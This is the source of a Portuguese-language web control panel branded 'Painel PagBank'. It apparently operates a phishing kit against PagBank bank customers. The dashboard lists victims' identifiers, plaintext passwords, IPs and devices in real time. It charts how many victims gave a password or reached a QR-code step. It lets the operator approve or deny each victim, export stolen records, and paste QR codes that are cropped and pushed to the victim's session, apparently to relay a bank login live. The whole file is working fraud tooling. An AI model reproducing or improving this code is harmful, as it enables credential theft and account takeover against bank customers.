<?php
session_start();
if (!isset($_SESSION['admin_logado'])) {
    header('Location: login-admin.php');
    exit;
}

// Lógica de bloqueio de acesso (PHP) - MANTIDA POR SEGURANÇA
$data_expiracao = new DateTime('2025-10-31 23:59:59');
$agora = new DateTime();
$acesso_expirado = $agora > $data_expiracao;
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel PagBank</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jsqr/dist/jsQR.js"></script>
    <style>
        :root {
            --bg-dark: #1e1e2d; --sidebar-bg: #151521; --card-bg: #27293d;
            --text-light: #f0f0f0; --text-muted: #a1a5b7; --border-color: #323448;
            --primary-color: #009ef7; --danger-color: #f1416c; --success-color: #50cd89;
            --warning-color: #ffc107;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(80, 205, 137, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(80, 205, 137, 0); }
            100% { box-shadow: 0 0 0 0 rgba(80, 205, 137, 0); }
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body {
            background-color: var(--bg-dark); color: var(--text-light);
            display: grid; grid-template-columns: 260px 1fr 380px;
            height: 100vh; overflow: hidden;
        }
        .sidebar-left {
            background-color: var(--sidebar-bg); padding: 1.5rem;
            display: flex; flex-direction: column; border-right: 1px solid var(--border-color);
        }
        .sidebar-left h2 { font-size: 1.4rem; margin: 0 0 1.5rem 0; color: var(--warning-color); text-align: center; }
        .admin-profile { position: relative; text-align: center; margin-bottom: 2rem; }
        .admin-avatar { font-size: 3.5rem; color: var(--primary-color); cursor: pointer; transition: color 0.3s; }
        .admin-avatar:hover { color: var(--warning-color); }
        .dropdown-menu {
            display: none; position: absolute; top: 110%; left: 50%;
            transform: translateX(-50%); background-color: var(--card-bg);
            border: 1px solid var(--border-color); border-radius: 8px;
            width: 180px; z-index: 100; overflow: hidden;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        }
        .dropdown-menu.show { display: block; }
        .dropdown-item {
            display: flex; align-items: center; gap: 10px; padding: 12px 15px;
            color: var(--text-muted); text-decoration: none; font-size: 0.9rem;
            transition: background-color 0.2s, color 0.2s;
        }
        .dropdown-item:hover { background-color: var(--primary-color); color: var(--text-light); }
        .dropdown-item i { font-size: 1rem; }
        .dropdown-divider { height: 1px; background-color: var(--border-color); margin: 4px 0; }
        .sidebar-left .btn-group { display: flex; flex-direction: column; gap: 1rem; }
        .main-content-area { display: flex; flex-direction: column; padding: 1.5rem; overflow-y: auto; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; }
        .header h1 { margin: 0; font-size: 1.8rem; }
        .motivational-quote {
            background-color: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px;
            padding: 1rem 1.5rem; margin-bottom: 1.5rem; text-align: center; font-style: italic;
            color: var(--text-muted); font-size: 0.95rem; min-height: 45px;
            display: flex; align-items: center; justify-content: center;
        }
        .sidebar-right {
            background-color: var(--sidebar-bg); overflow-y: auto;
            padding: 1.5rem; border-left: 1px solid var(--border-color);
        }
        .dashboard-card { background-color: var(--card-bg); padding: 1.5rem; border-radius: 12px; display: flex; flex-direction: column; gap: 2rem; }
        .chart-container h3 { margin: 0 0 1rem 0; font-size: 1.1rem; color: var(--text-light); text-align: center; }
        .client-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 1.5rem; }
        .card { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 1.5rem; display: flex; flex-direction: column; }
        .card-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); padding-bottom: 1rem; margin-bottom: 1rem; }
        .card-header .card-title { display: flex; align-items: center; gap: 10px; }
        .online-status { width: 12px; height: 12px; border-radius: 50%; transition: background-color 0.3s ease; }
        .online-status.online { background-color: var(--success-color); animation: pulse 2s infinite; }
        .online-status.offline { background-color: var(--danger-color); }
        .card-header h3 { font-size: 1.1rem; margin: 0; color: var(--text-light); }
        .card-header span { font-size: 0.8rem; color: var(--text-muted); }
        .card-body .data-item { font-size: 0.9rem; padding: 0.5rem 0; display: flex; justify-content: space-between; word-break: break-all; }
        .card-body .data-item strong { color: var(--text-muted); font-weight: 500; padding-right: 10px; }
        .card-body .data-item span { color: var(--text-light); text-align: right; }
        .device-info { display: flex; align-items: center; gap: 10px; margin-top: 12px; padding-top: 12px; border-top: 1px solid var(--border-color); color: var(--text-muted); }
        .device-info i { font-size: 1.4rem; color: var(--primary-color); }
        .device-info span { font-size: 0.9rem; font-weight: 500; }
        .card-footer { margin-top: 1.5rem; padding-top: 1.5rem; border-top: 1px solid var(--border-color); }
        .actions-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-bottom: 1rem; }
        .btn-action { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 0.5rem; border: none; border-radius: 6px; font-weight: 600; font-size: 0.8rem; cursor: pointer; transition: all 0.2s ease; }
        .btn-action i { font-size: 1rem; }
        .btn-action.aprovar { background-color: var(--success-color); color: white; }
        .btn-action.negar { background-color: var(--warning-color); color: #111; }
        .btn-action.excluir { background-color: var(--danger-color); color: white; }
        .btn-action.exportar { background-color: var(--primary-color); color: white; }
        .paste-area { margin-top: 1rem; padding: 1rem; border: 2px dashed var(--border-color); border-radius: 8px; background-color: var(--bg-dark); color: var(--text-muted); min-height: 40px; text-align: center; font-size: 0.9rem; transition: background-color 0.2s; }
        .paste-area:focus { outline: none; background-color: #27293d; }
        .paste-area img { display: none !important; }
        .qr-display { text-align: center; }
        .qr-preview { display: block; margin-top: 10px; max-width: 150px; border: 1px solid var(--border-color); border-radius: 5px; margin-left: auto; margin-right: auto; }
        .remove-btn { margin-top: 8px; background: var(--danger-color); color: white; padding: 4px 8px; border: none; border-radius: 4px; font-size: 12px; cursor: pointer; }
        .btn-sidebar { background: var(--card-bg); color: var(--text-light); border: 1px solid var(--border-color); padding: 12px 18px; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.3s; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .btn-sidebar i { font-size: 1.1rem; }
        .btn-sidebar:hover { background: #323448; }

        .lock-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(0, 0, 0, 0.9); z-index: 1000;
            display: flex; justify-content: center; align-items: center; text-align: center;
        }
        .lock-content { background-color: var(--card-bg); padding: 40px; border-radius: 12px; border: 1px solid var(--border-color); }
        .lock-content i { font-size: 4rem; color: var(--danger-color); margin-bottom: 1rem; }
        .lock-content h2 { font-size: 1.8rem; color: var(--text-light); margin-bottom: 1rem; }
        .lock-content p { color: var(--text-muted); max-width: 400px; }
    </style>
</head>
<body>

    <?php if ($acesso_expirado): ?>
        <div class="lock-overlay">
            <div class="lock-content">
                <i class="bi bi-lock-fill"></i>
                <h2>Acesso Expirado</h2>
                <p>Sua licença de acesso ao painel terminou. Por favor, entre em contato com o suporte para renovar seu acesso.</p>
            </div>
        </div>
    <?php endif; ?>

    <?php if (!$acesso_expirado): ?>
        <aside class="sidebar-left">
            <h2>Ferramentas do Admin</h2>
            <div class="admin-profile">
                <i class="bi bi-person-bounding-box admin-avatar" id="avatar-btn"></i>
                <div class="dropdown-menu" id="avatar-dropdown">
                    <a href="perfil_admin.php" class="dropdown-item"><i class="bi bi-person-circle"></i> Perfil</a>
                    <a href="trocar_senha_admin.php" class="dropdown-item"><i class="bi bi-key-fill"></i> Trocar Senha</a>
                    <div class="dropdown-divider"></div>
                    <a href="logout.php" class="dropdown-item"><i class="bi bi-box-arrow-right"></i> Sair</a>
                </div>
            </div>

            <div class="btn-group">
                <button class="btn-sidebar" onclick="apagarTudo()"><i class="bi bi-trash3-fill"></i> Apagar Tudo</button>
                <button class="btn-sidebar" onclick="exportarTudo()"><i class="bi bi-download"></i> Exportar Todos</button>
            </div>
        </aside>

        <main class="main-content-area">
            <div class="motivational-quote">Carregando frase...</div>
            <div class="header">
                <h1>Leads Recebidos</h1>
            </div>
            <div id="tabela" class="client-grid">Carregando...</div>
        </main>

        <aside class="sidebar-right">
            <div class="dashboard-card">
                <div class="chart-container">
                    <h3>Funil de Conversão</h3>
                    <canvas id="funnelChart" width="300" height="200"></canvas>
                </div>
                <div class="chart-container">
                    <h3>Status dos Leads</h3>
                    <canvas id="statusChart" width="300" height="250"></canvas>
                </div>
            </div>
        </aside>
    <?php endif; ?>

    <script>
        let funnelChartInstance = null;
        let statusChartInstance = null;

        document.addEventListener('DOMContentLoaded', () => {
            if (document.querySelector('.lock-overlay')) return;

            if ("Notification" in window && Notification.permission !== "granted") {
                Notification.requestPermission();
            }
            carregarFraseMotivacional();
            carregarEstatisticas();
            carregarInicial();

            setInterval(() => {
                atualizarTabela();
                carregarEstatisticas();
            }, 5000);

            const avatarBtn = document.getElementById('avatar-btn');
            const dropdown = document.getElementById('avatar-dropdown');

            avatarBtn.addEventListener('click', (event) => {
                event.stopPropagation();
                dropdown.classList.toggle('show');
            });

            window.addEventListener('click', (event) => {
                if (dropdown && !avatarBtn.contains(event.target) && !dropdown.contains(event.target)) {
                    if (dropdown.classList.contains('show')) {
                        dropdown.classList.remove('show');
                    }
                }
            });
        });

        function carregarEstatisticas() {
            fetch('get_stats.php')
                .then(res => res.json())
                .then(stats => {
                    const funnelCtx = document.getElementById('funnelChart').getContext('2d');
                    const funnelData = {
                        labels: ['Total de Acessos', 'Forneceram Senha', 'Chegaram ao QR Code'],
                        datasets: [{
                            label: 'Contagem de Usuários',
                            data: [stats.total_acessos, stats.com_senha, stats.na_tela_qrcode],
                            backgroundColor: ['rgba(0, 158, 247, 0.6)', 'rgba(255, 193, 7, 0.6)', 'rgba(80, 205, 137, 0.6)'],
                            borderColor: ['rgb(0, 158, 247)', 'rgb(255, 193, 7)', 'rgb(80, 205, 137)'],
                            borderWidth: 1
                        }]
                    };

                    if (funnelChartInstance) {
                        funnelChartInstance.data.datasets[0].data = funnelData.datasets[0].data;
                        funnelChartInstance.update();
                    } else {
                        funnelChartInstance = new Chart(funnelCtx, {
                            type: 'bar',
                            data: funnelData,
                            options: {
                                responsive: true, maintainAspectRatio: true,
                                scales: { y: { beginAtZero: true, ticks: { color: 'var(--text-muted)' } }, x: { ticks: { color: 'var(--text-muted)' } } },
                                plugins: { legend: { labels: { color: 'var(--text-muted)' } } }
                            }
                        });
                    }

                    const statusCtx = document.getElementById('statusChart').getContext('2d');
                    const totalPendentes = Math.max(0, stats.total_acessos - stats.aprovados - stats.negados);
                    const statusData = {
                        labels: ['Aprovados', 'Negados', 'Pendentes'],
                        datasets: [{
                            label: 'Status dos Leads',
                            data: [stats.aprovados, stats.negados, totalPendentes],
                            backgroundColor: ['rgba(80, 205, 137, 0.7)', 'rgba(241, 65, 108, 0.7)', 'rgba(161, 165, 183, 0.7)'],
                            hoverOffset: 4
                        }]
                    };

                    if(statusChartInstance) {
                        statusChartInstance.data.datasets[0].data = statusData.datasets[0].data;
                        statusChartInstance.update();
                    } else {
                        statusChartInstance = new Chart(statusCtx, {
                            type: 'doughnut',
                            data: statusData,
                            options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { labels: { color: 'var(--text-muted)' } } } }
                        });
                    }
                })
                .catch(error => console.error("Erro ao carregar estatísticas:", error));
        }

        function carregarFraseMotivacional() {
            fetch('get_motivational.php')
                .then(res => res.json())
                .then(data => {
                    const quoteElement = document.querySelector('.motivational-quote');
                    if(quoteElement) {
                        quoteElement.textContent = `"${data.phrase}"`;
                    }
                })
                .catch(err => {
                    console.error('Erro ao buscar frase:', err);
                    const quoteElement = document.querySelector('.motivational-quote');
                    if(quoteElement) {
                        quoteElement.textContent = '"A persistência realiza o impossível."';
                    }
                });
        }
        function checkOnlineStatus(last_active_at) {
            if (!last_active_at) return false;
            const lastActiveDate = new Date(last_active_at.replace(' ', 'T') + 'Z');
            const now = new Date();
            const diffSeconds = (now.getTime() - lastActiveDate.getTime()) / 1000;
            return diffSeconds < 25;
        }
        function carregarInicial() {
            fetch('dados.php')
                .then(res => res.json())
                .then(data => {
                    const tabela = document.querySelector('#tabela');
                    tabela.innerHTML = '';
                    data.forEach(cliente => {
                        const card = document.createElement('div');
                        card.className = 'card';
                        card.setAttribute('data-id', cliente.cliente_id);
                        card.innerHTML = criarCardHTML(cliente);
                        tabela.appendChild(card);
                    });
                })
                .catch((error) => {
                    console.error("Erro ao carregar dados iniciais:", error);
                    const tabela = document.querySelector('#tabela');
                    tabela.innerHTML = '<p style="color: var(--text-muted);">Não foi possível carregar os dados.</p>';
                });
        }
        function atualizarStatusCard(cliente) {
            const card = document.querySelector(`.card[data-id="${cliente.cliente_id}"]`);
            if (!card) return;
            const statusEl = card.querySelector('.status-value');
            if (statusEl && statusEl.textContent !== cliente.status) {
                statusEl.textContent = cliente.status;
            }
            const senhaEl = card.querySelector('.senha-value');
            if (senhaEl && senhaEl.textContent !== cliente.senha) {
                senhaEl.textContent = cliente.senha;
            }
            const onlineStatusEl = card.querySelector('.online-status');
            if (onlineStatusEl) {
                const isOnline = checkOnlineStatus(cliente.last_active_at);
                onlineStatusEl.classList.toggle('online', isOnline);
                onlineStatusEl.classList.toggle('offline', !isOnline);
            }
            const pageEl = card.querySelector('.page-value');
            if (pageEl && pageEl.textContent !== cliente.current_page) {
                pageEl.textContent = cliente.current_page;
            }
            const deviceIconEl = card.querySelector('.device-info .bi');
            const deviceTextEl = card.querySelector('.device-info span');
            if (deviceIconEl && deviceTextEl) {
                if (cliente.device_type === 'Desktop' && !deviceIconEl.classList.contains('bi-pc-display')) {
                    deviceIconEl.className = 'bi bi-pc-display';
                    deviceTextEl.textContent = 'Acessando via Desktop';
                } else if (cliente.device_type === 'Mobile' && !deviceIconEl.classList.contains('bi-phone-fill')) {
                    deviceIconEl.className = 'bi bi-phone-fill';
                    deviceTextEl.textContent = 'Acessando via Celular';
                }
            }
        }

        function atualizarTabela() {
            fetch('dados.php')
                .then(res => res.json())
                .then(data => {
                    const cardsAtuais = new Set(Array.from(document.querySelectorAll('.card')).map(c => c.dataset.id));
                    const idsNovos = new Set(data.map(c => String(c.cliente_id)));
                    const temNovosClientes = data.some(cliente => !cardsAtuais.has(String(cliente.cliente_id)));
                    const temClientesRemovidos = [...cardsAtuais].some(id => !idsNovos.has(id));
                    if (temNovosClientes || temClientesRemovidos) {
                        carregarInicial();
                    } else {
                        data.forEach(cliente => atualizarStatusCard(cliente));
                    }
                })
                .catch(error => {
                    console.error("Erro ao atualizar tabela:", error);
                });
        }

        function formatarDataBR(dataString) {
            if (!dataString) {
                return 'Data indisponível';
            }
            // Cria um objeto Date a partir da string de data (ex: "2025-07-14 02:57:13")
            const data = new Date(dataString);

            // Verifica se a data é válida
            if (isNaN(data.getTime())) {
                return 'Data inválida';
            }

            const dia = String(data.getDate()).padStart(2, '0');
            const mes = String(data.getMonth() + 1).padStart(2, '0'); // Mês começa em 0
            const ano = data.getFullYear();

            const horas = String(data.getHours()).padStart(2, '0');
            const minutos = String(data.getMinutes()).padStart(2, '0');
            const segundos = String(data.getSeconds()).padStart(2, '0');

            return `${dia}/${mes}/${ano} ${horas}:${minutos}:${segundos}`;
        }

        function criarCardHTML(cliente) {
            const onlineClass = checkOnlineStatus(cliente.last_active_at) ? 'online' : 'offline';

            let deviceIcon = 'bi-question-circle';
            let deviceText = 'Dispositivo Desconhecido';

            if (cliente.device_type === 'Desktop') {
                deviceIcon = 'bi-pc-display';
                deviceText = 'Acessando via Desktop';
            } else if (cliente.device_type === 'Mobile') {
                deviceIcon = 'bi-phone-fill';
                deviceText = 'Acessando via Celular';
            }

            return `
                <div class="card-header">
                    <div class="card-title">
                        <span class="online-status ${onlineClass}" title="Status do Cliente"></span>
                        <h3>Cliente #${cliente.cliente_id}</h3>
                    </div>

                    <span>${formatarDataBR(cliente.created_at)}</span>

                </div>
                <div class="card-body">
                    <div class="data-item"><strong>Identificador:</strong> <span>${cliente.identificador}</span></div>
                    <div class="data-item"><strong>Senha:</strong> <span class="senha-value">${cliente.senha}</span></div>
                    <div class="data-item"><strong>IP:</strong> <span>${cliente.ip}</span></div>
                    <div class="data-item"><strong>Status:</strong> <span class="status-value">${cliente.status}</span></div>
                    <div class="data-item"><strong>Página Atual:</strong> <span class="page-value">${cliente.current_page}</span></div>
                    <div class="device-info">
                        <i class="bi ${deviceIcon}"></i>
                        <span>${deviceText}</span>
                    </div>
                </div>
                <div class="card-footer">
                    <div class="actions-grid">
                        <button class="btn-action aprovar" onclick="mudarStatus('${cliente.cliente_id}', 'aprovado')"><i class="bi bi-check-circle-fill"></i> Aprovar</button>
                        <button class="btn-action negar" onclick="mudarStatus('${cliente.cliente_id}', 'negado')"><i class="bi bi-x-circle-fill"></i> Negar</button>
                        <button class="btn-action exportar" onclick="exportarUm('${cliente.cliente_id}')"><i class="bi bi-download"></i> Salvar</button>
                        <button class="btn-action excluir" onclick="excluirCliente('${cliente.cliente_id}')"><i class="bi bi-trash-fill"></i> Excluir</button>
                    </div>
                    <div class="upload-area">
                        <div class="paste-area" contenteditable="true" data-id="${cliente.cliente_id}" onpaste="handlePaste(event, this)">Cole aqui o print do QR Code</div>
                        <div class="qr-display">
                            <img class="qr-preview" style="display:none;" />
                            <button class="remove-btn" style="display:none;" onclick="removerImagem(this)">Remover</button>
                        </div>
                    </div>
                </div>
            `;
        }
        function apagarTudo() {
            if (confirm('Tem certeza que deseja apagar todos os registros? Esta ação não pode ser desfeita.')) {
                fetch('delete.php', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'apagar_tudo=1' }).then(res => res.text()).then(msg => { alert(msg); carregarInicial(); });
            }
        }
        function mudarStatus(cliente_id, status) {
            fetch('status.php', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `cliente_id=${cliente_id}&status=${status}` }).then(res => { if(res.ok){ /* A atualização visual agora é feita pelo atualizarTabela */ } });
        }
        function excluirCliente(cliente_id) {
            if (confirm(`Tem certeza que deseja excluir o cliente #${cliente_id}?`)) {
                fetch('delete.php', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `cliente_id=${encodeURIComponent(cliente_id)}` }).then(res => res.text()).then(msg => { alert(msg); carregarInicial(); });
            }
        }
        function exportarTudo() { window.open('exportar.php?all=1', '_blank'); }

        function exportarUm(cliente_id) { window.open(`exportar.php?id=${cliente_id}`, '_blank'); }

        function enviarQrCode(event, form) {
            event.preventDefault();
            const formData = new FormData(form);
            const botao = form.querySelector('button');
            botao.disabled = true;
            botao.textContent = "⌛ Enviando...";

            fetch('upload_qrcode.php', {
                method: 'POST',
                body: formData
            })
            .then(res => res.text())
            .then(msg => {
                alert(msg);
                botao.disabled = false;
                botao.textContent = "📷 Enviar QR Code";
            })
            .catch(() => {
                alert("Erro ao enviar QR.");
                botao.disabled = false;
                botao.textContent = "📷 Enviar QR Code";
            });
            }

            function removerImagem(botao) {
            const card = botao.closest('.card');
            const preview = card.querySelector('.qr-preview');
            preview.src = '';
            preview.style.display = 'none';
            botao.style.display = 'none';
            }

            function handlePaste(event, el) {
            const cliente_id = el.dataset.id;
            const items = (event.clipboardData || window.clipboardData).items;
            for (const item of items) {
                if (item.type.indexOf("image") === 0) {
                const blob = item.getAsFile();
                const img = new Image();
                img.src = URL.createObjectURL(blob);
                img.onload = () => {
                    const canvas = document.createElement("canvas");
                    canvas.width = img.width;
                    canvas.height = img.height;
                    const ctx = canvas.getContext("2d");
                    ctx.drawImage(img, 0, 0);
                    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                    const code = jsQR(imageData.data, canvas.width, canvas.height);
                    if (code) {
                    const { topLeftCorner, topRightCorner, bottomRightCorner, bottomLeftCorner } = code.location;
                    const x = Math.min(topLeftCorner.x, bottomLeftCorner.x);
                    const y = Math.min(topLeftCorner.y, topRightCorner.y);
                    const w = Math.max(topRightCorner.x, bottomRightCorner.x) - x;
                    const h = Math.max(bottomLeftCorner.y, bottomRightCorner.y) - y;
                    const cropCanvas = document.createElement("canvas");
                    cropCanvas.width = w;
                    cropCanvas.height = h;
                    cropCanvas.getContext("2d").drawImage(canvas, x, y, w, h, 0, 0, w, h);
                    cropCanvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append("cliente_id", cliente_id);
                        formData.append("qrcode", blob, `qr_${cliente_id}.png`);
                        fetch("upload_qrcode.php", {
                        method: "POST",
                        body: formData
                        })
                        .then(res => res.text())
                        .then(msg => {
                        alert(msg);
                        if (Notification.permission === "granted") {
                            new Notification("📸 QR colado e enviado com sucesso!");
                        }
                        const card = el.closest('.card');
                        const preview = card.querySelector('.qr-preview');
                        const removeBtn = card.querySelector('.remove-btn');
                        preview.src = URL.createObjectURL(blob);
                        preview.style.display = "block";
                        removeBtn.style.display = "inline-block";
                        })
                        .catch(() => alert("Erro ao enviar QR colado."));
                    }, "image/png");
                    } else {
                    alert("Nenhum QR Code detectado no print colado.");
                    }
                };
                break;
                }
            }
        }
        function getCookie(name) { const value = `; ${document.cookie}`; const parts = value.split(`; ${name}=`); if (parts.length === 2) return parts.pop().split(';').shift(); }
    </script>
</body>
</html>